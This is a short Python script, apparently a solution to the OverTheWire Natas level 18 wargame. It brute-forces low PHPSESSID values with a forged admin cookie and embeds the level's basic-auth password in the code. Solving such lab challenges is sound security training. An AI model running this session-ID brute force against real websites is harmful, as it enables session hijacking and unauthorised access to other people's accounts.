import requests

# Just a little low range session ID brute forcing

def force_session():
    counter = 1
    session_found = False
    while not session_found and counter < 641:
        cookie = {"PHPSESSID": str(counter), "admin": "1"}
        test = requests.post('http://natas18.natas.labs.overthewire.org/index.php?username=admin&password=admin', auth=('natas18', 'xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP'), cookies=cookie)
        if "next" in test.text:
            session_found = True
            print(counter)
            print(test.text)
        else:
            counter = counter + 1
    return True

force_session()
